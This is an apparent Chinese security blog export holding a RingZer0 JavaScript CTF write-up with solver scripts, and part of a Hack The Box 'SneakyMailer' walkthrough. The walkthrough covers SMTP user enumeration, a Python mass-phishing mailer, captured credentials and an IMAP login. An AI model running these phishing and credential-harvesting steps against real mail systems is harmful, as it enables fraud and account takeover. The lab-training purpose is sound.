_0xf382x2=_0xc360[2];if(_0xf382x1==_0xc360[3]+_0xf382x2)&#123;if(document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4])==-1)&#123;document[_0xc360[7]]=document[_0xc360[7]][_0xc360[6]]+_0xc360[4]+_0xf382x1;&#125; ;&#125; else &#123;$(_0xc360[10])[_0xc360[9]](_0xc360[8]);&#125; ;&#125; ); 我个人习惯是用这个网站先去一层混淆。然后再来看源码 123456789101112var _0xc360 = [\"val\", \"#cpass\", \"alk3\", \"02l1\", \"?p=\", \"indexOf\", \"href\", \"location\", \"&lt;div class=\\'error\\'&gt;Wrong password sorry.&lt;/div&gt;\", \"html\", \"#cresponse\", \"click\", \".c_submit\"];$(_0xc360[12])[_0xc360[11]](function () &#123; var _0xf382x1 = $(_0xc360[1])[_0xc360[0]](); var _0xf382x2 = _0xc360[2]; if (_0xf382x1 == _0xc360[3] + _0xf382x2) &#123; if (document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4]) == -1) &#123; document[_0xc360[7]] = document[_0xc360[7]][_0xc360[6]] + _0xc360[4] + _0xf382x1; &#125;; &#125; else &#123; $(_0xc360[10])[_0xc360[9]](_0xc360[8]); &#125;;&#125;); 其实还可以进一步去混淆。但是我并没有找到太好的网站。所以选择直接看。不难发现if语句及前面一行的内容是var _0xf382x2 = &#39;alk3&#39;; if(_0xf382x1 == &#39;02l1&#39; + _0xf382x2 ) 很清晰的表明了验证方式及密码02l1alk3 0x0412345678910111213141516171819202122$(\".c_submit\").click(function(event) &#123; event.preventDefault(); var k = CryptoJS.SHA256(\"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\"); var u = $(\"#cuser\").val(); var p = $(\"#cpass\").val(); var t = true; if(u == \"\\x68\\x34\\x78\\x30\\x72\") &#123; if(!CryptoJS.AES.encrypt(p, CryptoJS.enc.Hex.parse(k.toString().substring(0,32)), &#123; iv: CryptoJS.enc.Hex.parse(k.toString().substring(32,64)) &#125;) == \"ob1xQz5ms9hRkPTx+ZHbVg==\") &#123; t = false; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125;&#125;); 这里就开始使用了算法进行处理了。不过我们可以清晰的看到。user只做了一个16进制的简单显示避免直观。而pass在iv已知的情况下进行aes算法的密文比较。所以我们可以直接解出pass. 写个node脚本转换下密码 123456789101112131415161718const cryptojs = require(\"crypto-js\");let k = cryptojs.SHA256(\"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\");let key = cryptojs.enc.Hex.parse(k.toString().substring(0,32));let iv = cryptojs.enc.Hex.parse(k.toString().substring(32,64));let encrypted = \"ob1xQz5ms9hRkPTx+ZHbVg==\";let p =cryptojs.AES.decrypt(encrypted,key,&#123;iv:iv&#125;);(function hex_to_ascii(str1) &#123; var hex = str1.toString(); var str = ''; for (var n = 0; n &lt; hex.length; n += 2) &#123; str += String.fromCharCode(parseInt(hex.substr(n, 2), 16)); &#125; console.log(str); &#125; )(p); 运行得到加上用户名扔进console其实就是h4x0r。所以即可登录拿flag. 0x05123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function curry( orig_func ) &#123; var ap = Array.prototype, args = arguments; function fn() &#123; ap.push.apply( fn.args, arguments ); return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args ); &#125; return function() &#123; fn.args = ap.slice.call( args, 1 ); return fn.apply( this, arguments ); &#125;;&#125;function callback(x,y,i,a) &#123; return !y.call(x, a[a[\"length\"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;;&#125;var ref = &#123;T : \"BG8\",J : \"jep\",j : \"M2L\",K : \"L23\",H : \"r1A\"&#125;;function validatekey()&#123; e = false; var _strKey = \"\"; try &#123; _strKey = document.getElementById(\"key\").value; var a = _strKey.split(\"-\"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + _strKey; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125; &#125;function equal(o,o1)&#123; var keys1 = Object.keys(o1); var keys = Object.keys(o); if(keys1.length != keys.length) return false; for(var i=0;i&lt;keys.length;i++) if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]]) return false; return true;&#125;function hook(f1,f2,f3) &#123; return function(x) &#123; return f2(f1(x),f3(x));&#125;;&#125;var h = curry(hook);var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function(\"a\",\"b\",\"return a &amp;&amp; b;\"));function genFunc(_part) &#123; if(!_part || !(_part.length) || _part.length !== 4) return function() &#123;&#125;; return new Function(_part.substring(1,3), \"this.\" + _part[3] + \"=\" + _part.slice(1,3) + \"+\" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : \"'\"+ _part[0] + \"'\"));&#125; 这题开始难度就上升了。我们先慢慢审计代码。 123456789101112131415161718192021222324252627function validatekey()&#123; e = false; var _strKey = \"\"; try &#123; _strKey = document.getElementById(\"key\").value; var a = _strKey.split(\"-\"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + _strKey; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125; &#125; 这里取了页面中key值（即输入）进行一系列判断。只有e为false时我们才能进入document.location = document.location.href + &quot;?p=&quot; + _strKey; 注意到其中主要要求是var a = _strKey.split(&quot;-&quot;); if(a.length !== 5)...... 所以我们需要一个格式为xxx-xxx-xxx-xxx-xxx的key. 接下来看其他函数。这里的curry()是一个很有意思的js柯里化的函数( 为什么不是库里233) 。常用于多参函数复用并且与callback相结合。不过我们不必深究,先来看逻辑。 12var h = curry(hook);var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function(\"a\",\"b\",\"return a &amp;&amp; b;\")); 首先是这里。出现了一个x&gt;=48，但是我们不知道x参数从哪里来。所以继续向下看 1return new Function(_part.substring(1,3), \"this.\" + _part[3] + \"=\" + _part.slice(1,3) + \"+\" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : \"'\"+ _part[0] + \"'\")); (fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ? _part[0] : &quot;&#39;&quot;+ _part[0] + &quot;&#39;&quot;)这一部分说明其返回的是函数输入的第一个字符。看到这个IIFE的调用以及前面我们fn函数的构造。可以得出，这里对我们输入的第1个字符进行了比较，其ascii值应该在48到57之间（即数字）就直接取数字，否则就加上&#39;&#39; 简单的调用下我们就可以看出来而这个整体是与_part.substring(1,3)作为参数被送进构造函数的。发现他是在key的检查里被调用了var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));我们回头看下callback函数的定义以及reduceRight函数的功能 12345function callback(x,y,i,a) &#123; return !y.call(x, a[a[\"length\"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;;&#125;reduceRight() 方法接受一个函数作为累加器（accumulator）和数组的每个值（从右到左）将其减少为单个值。 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight参考上面的文档我们知道，callback作为回调函数，用于操作数组中的每个元素，而我们传入的a[4]生成的函数是数组最右的起点。之后依次向左进行处理。 这里我尽量作完整的解释。首先callback中a[&quot;length&quot;]-1-i对应的是a.length-1-i即5-1-i=4-i.然后callback函数的四个参数分别对应了空map，构造函数，叠加器的趟数，以及被处理过的输入a（从xxxx-xxxx-xxxx-xxxx-xxxx 变成一个5元素的数组）我们简单调用下,会发现最终返回的结果中每个数组元素的第二，三个会不变，并变成新的map中对应值的第一二位。然后值的最后一位会变成原来输入数组的逆序第一位的第一个字母。而整个返回的map键名是原输入数组逆序的最后一个字母。 多说无益。我们用一个四元素的数组来看看返回结果可以看到，返回的map表中第一个元素键名来自原来数组最后一个元素mnop的最后一个字母。值部分bc保持不变，最后一个字母则是mnop的第一个字母m. 既然我们需要满足输入key处理后为{T : &quot;BG8&quot;,J : &quot;jep&quot;,j : &quot;M2L&quot;,K : &quot;L23&quot;,H : &quot;r1A&quot;}; 写个脚本处理下即可 1234567891011121314var src = 'abcd-efgh-ijkl-mnop-qrst';var dst = 'tbcq-pfgm-ljki-hnoe-drsa';var key = 'TBG8-Jjep-jM2L-KL23-Hr1A';var input = key;for (i=0; i&lt;src.length; i++) &#123; p = dst.indexOf(src[i]); tmp = input.split(''); tmp[p] = key[i]; input = tmp.join('');&#125;console.log(input); 得到keyABGH-3jeK-LM2j-pL2J-8r1T 0x061234567891011121314151617181920212223242526// Look's like weak JavaScript auth script :)$(\".c_submit\").click(function(event) &#123; event.preventDefault(); var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = $(\"#cuser\").val(); var p = $(\"#cpass\").val(); var t = true; if(u == \"administrator\") &#123; for(i = 0; i &lt; u.length; i++) &#123; if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); t = false; break; &#125; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125;&#125;); 相比上一题算是小菜了。用户输入密码的ascii会与用户名administrator进行加法运算并与已知数组值进行比较。那么逆写即可 1234567891011k = [176,214,205,246,264,255,227,237,242,244,265,270,283]u = [97,100,109,105,110,105,115,116,114,97,116,111,114]p = &#123;&#125;s = \"administrator\"list1=[]for i in range(0, len(s)): p[i] = k[i] - u[i] - i*10 list1.append(p[i]) print(''.join(chr(i) for i in list1)) 得到OhLord4309111 0x071234567891011121314151617181920212223242526272829303132333435// Look's like weak JavaScript auth script :)$(\".c_submit\").click(function(event) &#123; event.preventDefault(); var u = $(\"#cpass\").val(); var k = $(\"#cuser\").val(); var func = \"\\x2B\\x09\\x4A\\x03\\x49\\x0F\\x0E\\x14\\x15\\x1A\\x00\\x10\\x3F\\x1A\\x71\\x5C\\x5B\\x5B\\x00\\x1A\\x16\\x38\\x06\\x46\\x66\\x5A\\x55\\x30\\x0A\\x03\\x1D\\x08\\x50\\x5F\\x51\\x15\\x6B\\x4F\\x19\\x56\\x00\\x54\\x1B\\x50\\x58\\x21\\x1A\\x0F\\x13\\x07\\x46\\x1D\\x58\\x58\\x21\\x0E\\x16\\x1F\\x06\\x5C\\x1D\\x5C\\x45\\x27\\x09\\x4C\\x1F\\x07\\x56\\x56\\x4C\\x78\\x24\\x47\\x40\\x49\\x19\\x0F\\x11\\x1D\\x17\\x7F\\x52\\x42\\x5B\\x58\\x1B\\x13\\x4F\\x17\\x26\\x00\\x01\\x03\\x04\\x57\\x5D\\x40\\x19\\x2E\\x00\\x01\\x17\\x1D\\x5B\\x5C\\x5A\\x17\\x7F\\x4F\\x06\\x19\\x0A\\x47\\x5E\\x51\\x59\\x36\\x41\\x0E\\x19\\x0A\\x53\\x47\\x5D\\x58\\x2C\\x41\\x0A\\x04\\x0C\\x54\\x13\\x1F\\x17\\x60\\x50\\x12\\x4B\\x4B\\x12\\x18\\x14\\x42\\x79\\x4F\\x1F\\x56\\x14\\x12\\x56\\x58\\x44\\x27\\x4F\\x19\\x56\\x49\\x16\\x1B\\x16\\x14\\x21\\x1D\\x07\\x05\\x19\\x5D\\x5D\\x47\\x52\\x60\\x46\\x4C\\x1E\\x1D\\x5F\\x5F\\x1C\\x15\\x7E\\x0B\\x0B\\x00\\x49\\x51\\x5F\\x55\\x44\\x31\\x52\\x45\\x13\\x1B\\x40\\x5C\\x46\\x10\\x7C\\x38\\x10\\x19\\x07\\x55\\x13\\x44\\x56\\x31\\x1C\\x15\\x19\\x1B\\x56\\x13\\x47\\x58\\x30\\x1D\\x1B\\x58\\x55\\x1D\\x57\\x5D\\x41\\x7C\\x4D\\x4B\\x4D\\x49\\x4F\"; buf = \"\"; if (k.length == 9) &#123; for (i = 0, j = 0; i &lt; func.length; i++) &#123; c = parseInt(func.charCodeAt(i)); c = c ^ k.charCodeAt(j); if (++j == k.length) &#123; j = 0; &#125; buf += eval('\"' + a(x(c)) + '\"'); &#125; eval(buf); &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125;&#125;);function a(h) &#123; if (h.length != 2) &#123; h = \"\\x30\" + h; &#125; return \"\\x5c\\x78\" + h;&#125;function x(d) &#123; if (d &lt; 0) &#123; d = 0xFFFFFFFF + d + 1; &#125; return d.toString(16).toUpperCase();&#125; 这里代码流程也比较复杂。简单概括就是去username作为输入然后每9个字符与所给的func进行异或。最后结果会转hex. 虽然我们不知道需要的username明文，但是可以利用a^b=c =&gt; a^c=b这点，猜测密文中可能会存在跟前面的出flag一致的 123if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; 所以我们简单爆破下username并进行内容筛选，找出有document出现的结果这里借用另一位师傅的脚本https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md 123456789101112131415161718192021222324252627282930313233343536var func = \"\\x2B\\x09\\x4A\\x03\\x49\\x0F\\x0E\\x14\\x15\\x1A\\x00\\x10\\x3F\\x1A\\x71\\x5C\\x5B\\x5B\\x00\\x1A\\x16\\x38\\x06\\x46\\x66\\x5A\\x55\\x30\\x0A\\x03\\x1D\\x08\\x50\\x5F\\x51\\x15\\x6B\\x4F\\x19\\x56\\x00\\x54\\x1B\\x50\\x58\\x21\\x1A\\x0F\\x13\\x07\\x46\\x1D\\x58\\x58\\x21\\x0E\\x16\\x1F\\x06\\x5C\\x1D\\x5C\\x45\\x27\\x09\\x4C\\x1F\\x07\\x56\\x56\\x4C\\x78\\x24\\x47\\x40\\x49\\x19\\x0F\\x11\\x1D\\x17\\x7F\\x52\\x42\\x5B\\x58\\x1B\\x13\\x4F\\x17\\x26\\x00\\x01\\x03\\x04\\x57\\x5D\\x40\\x19\\x2E\\x00\\x01\\x17\\x1D\\x5B\\x5C\\x5A\\x17\\x7F\\x4F\\x06\\x19\\x0A\\x47\\x5E\\x51\\x59\\x36\\x41\\x0E\\x19\\x0A\\x53\\x47\\x5D\\x58\\x2C\\x41\\x0A\\x04\\x0C\\x54\\x13\\x1F\\x17\\x60\\x50\\x12\\x4B\\x4B\\x12\\x18\\x14\\x42\\x79\\x4F\\x1F\\x56\\x14\\x12\\x56\\x58\\x44\\x27\\x4F\\x19\\x56\\x49\\x16\\x1B\\x16\\x14\\x21\\x1D\\x07\\x05\\x19\\x5D\\x5D\\x47\\x52\\x60\\x46\\x4C\\x1E\\x1D\\x5F\\x5F\\x1C\\x15\\x7E\\x0B\\x0B\\x00\\x49\\x51\\x5F\\x55\\x44\\x31\\x52\\x45\\x13\\x1B\\x40\\x5C\\x46\\x10\\x7C\\x38\\x10\\x19\\x07\\x55\\x13\\x44\\x56\\x31\\x1C\\x15\\x19\\x1B\\x56\\x13\\x47\\x58\\x30\\x1D\\x1B\\x58\\x55\\x1D\\x57\\x5D\\x41\\x7C\\x4D\\x4B\\x4D\\x49\\x4F\";function xor(ori_chr, dst_chr)&#123; return String.fromCharCode(ori_chr.charCodeAt() ^ dst_chr.charCodeAt());&#125;function decode(key)&#123; var buffer = '' for (var i = 0; i &lt; func.length; i++) &#123; buffer += xor(key[i % 9], func[i]) &#125; return buffer;&#125;function guess(i, guesskey)&#123; key = [] for (var j = 0; j &lt; guesskey.length; j++) &#123; key[(i+j) % 9] = xor(guesskey[j], func[i + j]) &#125; return key.join('');&#125;for (var i = 0; i &lt; func.length - 9; i++) &#123; key = guess(i, 'document.'); finalbuffer = decode(key); if (finalbuffer.indexOf('document.location') != -1) &#123; console.log(i, key, finalbuffer); &#125;&#125; 拿到用户名密码 小结简单小结下，js的trick还是挺多的，不过这几道题接触到trick的层面很浅。真正CTF比赛中运用到弱类型之类的倒是比较有意思。而这些challenge更多的就是利用js来混淆视听之类的，所以老实说比较考验代码审计的耐心跟debug水平。 这个平台的jail系列有时间会去做做。","categories":[],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://www.bycsec.top/tags/javascript/"}]},{"title":"hackthebox-SneakyMailer","slug":"hackthebox-SneakyMailer","date":"2020-07-16T10:57:21.000Z","updated":"2021-02-18T05:09:24.139Z","comments":true,"path":"2020/07/16/hackthebox-SneakyMailer/","link":"","permalink":"https://www.bycsec.top/2020/07/16/hackthebox-SneakyMailer/","excerpt":"SneakyMailer是自己在htb上完成的第30台靶机。因为特殊纪念意义加上涉及到一些很有意思的知识所以记录下。整体难度比较简单。 由于SneakyMailer还是active状态，所以我会给文章上锁直到靶机退役。ps:已退役","text":"SneakyMailer是自己在htb上完成的第30台靶机。因为特殊纪念意义加上涉及到一些很有意思的知识所以记录下。整体难度比较简单。 由于SneakyMailer还是active状态，所以我会给文章上锁直到靶机退役。ps:已退役 靶机ip： 10.10.10.197 攻击机： 10.10.14.87 initial foothold首先上nmap 12345678910111213141516171819202122232425262728293031323334353637# Nmap 7.80 scan initiated Mon Jul 13 10:04:34 2020 as: nmap -sC -sV -oA nmap/sneakymailer 10.10.10.197Nmap scan report for 10.10.10.197Host is up (0.41s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)| 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Did not follow redirect to http://sneakycorp.htb143/tcp open imap Courier Imapd (released 2018)|_imap-capabilities: ENABLE THREAD=ORDEREDSUBJECT UTF8=ACCEPTA0001 OK QUOTA SORT CHILDREN STARTTLS IMAP4rev1 THREAD=REFERENCES ACL2=UNION NAMESPACE ACL IDLE CAPABILITY completed UIDPLUS| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time993/tcp open ssl/imap Courier Imapd (released 2018)| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open http nginx 1.14.2|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: nginx/1.14.2|_http-title: Welcome to nginx!Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jul 13 10:05:43 2020 -- 1 IP address (1 host up) scanned in 68.86 seconds nmap得到结果有多个端口开放，其中不太常规的是25,143,993等端口。正如结果所示，这些端口都与邮件有关。其中25是smtp端口。143,993是imap的默认两个端口。其中一个是明文一个是ssl加密。 21ftp端口不能匿名登录。那我们先从80端口开始。开始一个跳转。所以我们需要把sneakycorp.htb加入到/etc/hosts中。web页面结果只有index.php与team.php存在。而team.php源码中存在几十个email.均是xxx@sneakymailer.htb形式。果断先把mail收集起来。并且user跟mail各存一份 123456789101112import requestsimport reurl='http://sneakycorp.htb/team.php'r=requests.get(url)mail=re.findall(r'&lt;td&gt;(.*)@sneakymailer.htb',r.text)f=open('user.txt','w')for i in mail: #f.write(i+'\\n') f.write(i+'@sneakymailer.htb'+'\\n')f.close() 然后源码中提示了一个pypi/register.php。访问后似乎可以提供注册功能。但是根据简单的几个demo感觉还是个静态文件。因为假如再次输入密码跟原密码不一致它也没有进行任何报错。那么我有理由怀疑整个网站都静态的。 既然如此只能从几个邮件服务器入手enum了。这里我先去了解了下smtp,imap的相关信息以及常见漏洞。简单概括如下： smtp主要用于发送邮件。imap主要用于接收邮件 smtp/imap server 均可使用 telnet,nc进行连接 smtp可以在不登录的情况下进行username的枚举。imap必须登录才能进行接下来的查看邮件信息等操作 并且两种服务基本上不存在可以直接利用的漏洞。看来是要进行信息枚举了。首先从25端口开始。前面提到了。针对smtp的enum主要就只有用户名的enum.我们无法进行进一步的利用。这篇文章讲的非常全面。我也基本上先按照这个流程来。比如首先进行手动测试VRFY root。得到252.说明root用户是在机器上的。不过经过前面nmap的探测,似乎能使用的smtp命令非常局限。看来我们只能从VRFY下手了。 这里使用msf的模块进行enum,具体方法参考上面文章。其实之前使用了smtp-user-enum。但似乎存在问题,没有得到我想要的结果。换了msf的模块就好了。 123456msf5 auxiliary(scanner/smtp/smtp_enum) &gt; exploit[*] 10.10.10.197:25 - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)[+] 10.10.10.197:25 - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb[*] 10.10.10.197:25 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 看起来我们得到的邮箱都是有效的……到这一步就很难进一步进行发展了。因为smtp的利用最多到枚举用户名。imap与ftp又需要用户密码。8080端口跑着一个似乎裸的nginx.顿时少了思路 去论坛逛了一圈。发现大家提到了钓鱼的说法。难不成是要发送邮件？简单搜索了下发现python支持我们调用smtp服务器进行email的发送。那就按照菜鸟教程的脚本改改 123456789101112131415161718192021222324#!/usr/bin/python# -*- coding: UTF-8 -*- import smtplibfrom email.mime.text import MIMETextfrom email.header import Header sender = 'byc@bycsec.top'with open('mail.txt','r') as f: receivers = f.read().splitlines()message = MIMEText('http://10.10.14.87', 'plain', 'utf-8')message['From'] = Header(\"byc\", 'utf-8')message['To'] = Header(\"aaa\", 'utf-8') subject = 'Sth Really Helpful'message['Subject'] = Header(subject, 'utf-8')try: smtpObj = smtplib.SMTP('10.10.10.197',25) smtpObj.sendmail(sender, receivers, message.as_string()) print(\"[*] success\")except smtplib.SMTPException: print(\"[*] Error\") 这里主要是更改smtplib.SMTP(&#39;10.10.10.197&#39;,25)。这样我们就能使用htb的smtp服务器进行发送邮件。同时receivers这个参数是支持python列表的。所以直接传入我们之前收集的所有email.最后内容直接给我们自己ip.看看会不会有点击劫持的信息发过来。 发现有post信息。那么再跑遍脚本,直接切换成nc接收 看起来paul用户的账号密码到手了。（经典钓鱼场景）接下来因为这是邮箱用户，我们用imap账户成功登录关于imap的命令执行 看了这篇文章应该就会操作了。简单的说就是在每个命令前都要加个字母做前缀。然后执行LOGIN,SELECT等操作第一步先查看namespace。然后发现我们的Personal Namespace有INBOX.存在。所以继续列 INBOX.下的文件夹。这样我们就可以选定一个文件夹了 1234567891011121314151617root@byc404:~# telnet 10.10.10.197 143Trying 10.10.10.197...Connected to 10.10.10.197.Escape character is '^]'.* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information.a login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)a OK LOGIN Ok.n namespace* NAMESPACE ((\"INBOX.\" \".\")) NIL ((\"#shared.\" \".\")(\"shared.\" \".\"))n OK NAMESPACE completed.A1 list \"INBOX.\" \"*\"* LIST (\\HasNoChildren) \".\" \"INBOX.Trash\"* LIST (\\HasNoChildren) \".\" \"INBOX.Sent\"* LIST (\\HasNoChildren) \".\" \"INBOX.Deleted Items\"* LIST (\\HasNoChildren) \".\" \"INBOX.Sent Items\"A1 OK LIST completed 经过尝试发现只有INBOX.Sent Items里有2 EXISTS. 12345678g21 SELECT \"INBOX.Sent Items\"* FLAGS (\\Draft \\Answered \\Flagged \\Deleted \\Seen \\Recent)* OK [PERMANENTFLAGS (\\* \\Draft \\Answered \\Flagged \\Deleted \\Seen)] Limited* 2 EXISTS* 0 RECENT* OK [UIDVALIDITY 589480766] Ok* OK [MYRIGHTS \"acdilrsw\"] ACLg21 OK [READ-WRITE] Ok 那么我们依次查看邮件主题与内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596f fetch 1:2 (BODY[HEADER.FIELDS (Subject)])* 1 FETCH (BODY[HEADER.FIELDS (\"Subject\")] &#123;27&#125;Subject: Password reset)* 2 FETCH (BODY[HEADER.FIELDS (\"Subject\")] &#123;27&#125;Subject: Module testing)f OK FETCH completed.F1 fetch 1 RFC822* 1 FETCH (RFC822 &#123;2167&#125;MIME-Version: 1.0To: root &lt;root@debian&gt;From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;Subject: Password resetDate: Fri, 15 May 2020 13:03:37 -0500Importance: normalX-Priority: 3Content-Type: multipart/alternative; boundary=\"_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_\"--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/plain; charset=\"utf-8\"Hello administrator, I want to change this password for the developer accou=ntUsername: developerOriginal-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]CPlease notify me when you do it=20--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/html; charset=\"utf-8\"&lt;html xmlns:o=3D\"urn:schemas-microsoft-com:office:office\" xmlns:w=3D\"urn:sc=hemas-microsoft-com:office:word\" xmlns:m=3D\"http://schemas.microsoft.com/of=fice/2004/12/omml\" xmlns=3D\"http://www.w3.org/TR/REC-html40\"&gt;&lt;head&gt;&lt;meta ht=tp-equiv=3DContent-Type content=3D\"text/html; charset=3Dutf-8\"&gt;&lt;meta name==3DGenerator content=3D\"Microsoft Word 15 (filtered medium)\"&gt;&lt;style&gt;&lt;!--/* Font Definitions */@font-face &#123;font-family:\"Cambria Math\"; panose-1:2 4 5 3 5 4 6 3 2 4;&#125;@font-face &#123;font-family:Calibri; panose-1:2 15 5 2 2 2 4 3 2 4;&#125;/* Style Definitions */p.MsoNormal, li.MsoNormal, div.MsoNormal &#123;margin:0in; margin-bottom:.0001pt; font-size:11.0pt; font-family:\"Calibri\",sans-serif;&#125;.MsoChpDefault &#123;mso-style-type:export-only;&#125;@page WordSection1 &#123;size:8.5in 11.0in; margin:1.0in 1.0in 1.0in 